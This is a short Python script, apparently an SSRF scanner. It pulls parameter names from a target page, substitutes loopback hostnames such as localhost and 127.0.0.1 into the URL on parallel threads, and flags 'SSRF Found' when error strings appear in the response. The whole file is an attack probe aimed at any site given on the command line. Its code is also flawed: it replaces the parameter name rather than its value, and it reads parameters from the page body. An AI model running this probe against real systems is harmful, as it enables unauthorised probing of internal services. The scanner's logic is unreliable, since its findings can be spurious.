from colorama import Fore
import requests
import re
import threading
import sys

# specify the URL to test
url = sys.argv[1]

# create a list of domains to test for SSRF
domains = ["localhost", "127.0.0.1", "0.0.0.0", "localhost.localdomain", "localhost6.localdomain6", "0:0:0:0:0:0:0:1"]

# define a function to check a single parameter for SSRF
def check_parameter(parameter):
    for domain in domains:
        try:
            # send a GET request with the current domain in the parameter
            response = requests.get(url.replace(parameter, domain))
            
            # check the response for signs of successful SSRF exploitation
            if re.search(r"connection refused|network is unreachable", response.text, re.IGNORECASE):
                print(f'{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} SSRF Found in: {Fore.MAGENTA}{parameter}')
                break
        except:
            # handle any exceptions that occur during the request
            pass

# send a GET request to the URL and extract all parameters
response = requests.get(url)
parameters = re.findall(r"\?(\w+)=", response.text)

# create a list of threads to check each parameter for SSRF
if __name__ == "__main__":
    threads = []
    for parameter in parameters:
        thread = threading.Thread(target=check_parameter, args=(parameter,))
        threads.append(thread)
        thread.start()

        # wait for all threads to complete
    for thread in threads:
        thread.join()

